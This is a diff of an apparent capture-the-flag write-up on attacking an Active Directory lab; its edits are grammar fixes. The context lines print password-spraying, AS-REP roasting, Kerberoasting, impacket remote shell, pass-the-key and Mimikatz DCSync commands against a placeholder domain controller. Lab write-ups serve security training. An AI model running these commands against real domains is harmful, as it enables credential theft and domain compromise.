@@ -24,7 +24,7 @@ Create a `users.txt` file with some commonly known AD user nicknames. Try to fet
 crackmapexec ldap dc01.xyz.com -u users.txt -p '' -k
 ```
 
-Now, maybe we can create a `passwords.txt` file with some `rockyou.txt` passwords.
+Now, we can create a `passwords.txt` file with some `rockyou.txt` passwords.
 
 ```sh
 crackmapexec ldap dc01.xyz.com -u users.txt -p passwords.txt --continue-on-success | grep '[+]'
@@ -36,7 +36,7 @@ If we are lucky enough, we will get a match. We can test a successful login with
 crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD
 ```
 
-To this commands we can append several flags:
+To these commands, we can append several flags:
 - `--pass-pol` to view the AD password policy.
 - `--users` to view the AD users.
 - `--groups` to view the AD groups.
@@ -91,15 +91,15 @@ pip install bloodhound
 
 Steps:
 
-- Login into bloodhound.
-- Upload data from previous collection with `bloodhound-python`.
+- Login into Bloodhound.
+- Upload data from the previous collection with `bloodhound-python`.
 - Explore the tool!
 
 # Impacket
 
 ## Get a Shell on that User (Local Admin Account)
 
-As we have a middle man which is the container, we need to change a little bit the logic of Impacket's python script:
+As we have a middle man who is the container, we need to change a little bit the logic of Impacket's python script:
 Ref: https://github.com/fortra/impacket/issues/272
 
 `nano /usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py`
@@ -108,12 +108,12 @@ Line 1283
 ```py
 LOG.debug('StringBinding chosen: %s' % stringBinding)
 if stringBinding is None:
-	stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
+    stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
     
 dcomInterface = transport.DCERPCTransportFactory(stringBinding)
 ```
 
-This command is only valid for the local admin account, due to the higher privilege level.
+This command is only valid for the local admin account due to the higher privilege level.
 
 `impacket-wmiexec xyz.com/USERNAME:PASSWORD@dc01.xyz.com -debug`
 
@@ -134,7 +134,7 @@ Try for RDP as well as impacket-psexec:
 
 `impacket-rdp_check xyz.com/USERNAME:PASSWORD@dc01.xyz.com`
 
-`impacket-psexec` doesn't give us any results because malicious code execution is flagged by Windows.
+`impacket-psexec` doesn't yield results because Windows flag malicious code execution.
 
 > Ref: https://www.trustedsec.com/blog/no_psexec_needed/
 
@@ -149,11 +149,11 @@ cd kerbrute
 pip install -r requirements.txt
 ```
 
-Run (where `users.txt` holds some User Accounts + Service Accounts) gives us matches between AD Users and passwords like *CrackMapExec* but it also warns for the fact that an account does not have pre-authentication enabled. It also saves TGT tickets for the targeted users in case a password is found.
+Run (where `users.txt` holds some User Accounts + Service Accounts) gives us matches between AD Users and passwords like *CrackMapExec*, but it also warns of the fact that an account does not have pre-authentication enabled. It also saves TGT tickets for the targeted users in case a password is found.
 
 `python3 kerbrute.py -domain xyz.com -users users.txt -passwords passwords.txt -outputfile domain_passwords.txt`
 
-Using CME we can also find accounts with pre-authentication disabled:
+Using CME, we can also find accounts with pre-authentication disabled:
 
 `crackmapexec ldap dc01.xyz.com -u users.txt -p '' --asreproast out.txt`
 
@@ -164,13 +164,13 @@ We then crack the account's AS-REP message offline using:
 
 # Kerberoasting (Needs Domain Account)
 
-At first, enumerate AD objects with:
+First, enumerate AD objects with the following:
 
 `crackmapexec smb dc01.xyz.com -u USERNAME -p PASSWORD -d xyz.com --rid-brute`
 
 ### Brute-forcing Passwords of ServiceAccounts (Only one Kerberoastable)
 
-With the information of the existing service accounts we can try to brute-force the service accounts but only one will be likely to succeed.
+With the information on the existing service accounts, we can brute-force the service accounts, but only one will likely succeed.
 
 ```sh
 crackmapexec smb dc01.xyz.com -u http_svc$ -p passwords.txt
@@ -181,7 +181,7 @@ crackmapexec smb dc01.xyz.com -u exchange_svc$ -p passwords.txt
 > Refs: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 
-A more elegant way consists on executing the Kerberoasting attack.
+A more elegant way consists of executing the Kerberoasting attack.
 
 We update the `users.txt` file with the service accounts:
 
@@ -190,7 +190,7 @@ We update the `users.txt` file with the service accounts:
 
 > Ref: getUserSPNs.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
 
-Using the `getUserSPNs.py` script from the above reference we fetch the TGS ticket from the vulnerable service account.
+Using the `getUserSPNs.py` script from the above reference, we fetch the TGS ticket from the vulnerable service account.
 
 `python getUserSPNs.py xyz.com/USERNAME:PASSWORD -usersfile users.txt -outputfile hashes.kerberoast`
 
@@ -223,13 +223,13 @@ impacket-wmiexec xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
 impacket-smbclient xyz.com/Administrator@dc01.xyz.com -k -no-pass -debug
 ```
 
-With each of them, the attacker can get to the *INTERNAL* share and get the secret flag.
+With each, the attacker can get to the *INTERNAL* share and get the secret flag.
 
 > Ref: https://www.thehacker.recipes/ad/movement/kerberos/ptk
 
 # PsExec Unintended Solution
 
-From the local administrator, download and run the *PsExec* executable with:
+From the local administrator, download and run the *PsExec* executable with the following:
 
 Download `PsExec` (https://learn.microsoft.com/en-us/sysinternals/downloads/psexec):
 
@@ -256,7 +256,7 @@ Download `PsExec` (https://learn.microsoft.com/en-us/sysinternals/downloads/psex
 
 ### DCSync Attack
 
-Use *Mimikatz* with Replication Account to perform DCSync attack and get NTLM hashes.
+Use *Mimikatz* with Replication Account to perform a DCSync attack and get NTLM hashes.
 
 `lsadump::dcsync /domain:xyz.com /user:krbtgt`
 
